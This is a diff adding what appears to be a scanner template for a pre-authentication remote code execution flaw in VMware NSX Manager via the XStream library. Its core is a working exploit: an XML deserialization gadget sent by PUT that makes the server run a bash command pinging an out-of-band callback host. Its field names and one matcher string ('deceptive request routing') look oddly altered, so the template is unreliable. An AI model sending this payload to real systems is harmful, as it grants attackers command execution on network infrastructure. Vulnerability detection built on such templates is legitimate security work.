@@ -1,0 +1,50 @@
+id: vmware-nsx-stream-rce
+brief:
+    title: VMware NSX Manager XStream Pre-authenticated Remote Code Execution
+    by: _0xf4n9x_
+    level: high
+    about: VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.
+    label:
+        - vmware
+        - xstream
+        - rce
+        - msf
+        - intrusive
+        - vuln
+moves:
+    - verb: PUT
+      to:
+        - '{{BaseURL}}/api/2.0/services/usermgmt/password/{{lowerrstr}}'
+      head:
+        Content-Type: application/xml
+      body: |-
+        <sorted-set>
+          <string>foo</string>
+          <dynamic-proxy>
+            <interface>java.lang.Comparable</interface>
+            <handler class="java.beans.EventHandler">
+              <target class="java.lang.ProcessBuilder">
+                <command>
+                  <string>bash</string>
+                  <string>-c</string>
+                  <string>ping {{os}}.{{interactsh-url}}</string>
+                </command>
+              </target>
+              <action>start</action>
+            </handler>
+          </dynamic-proxy>
+        </sorted-set>
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - deceptive request routing
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 400
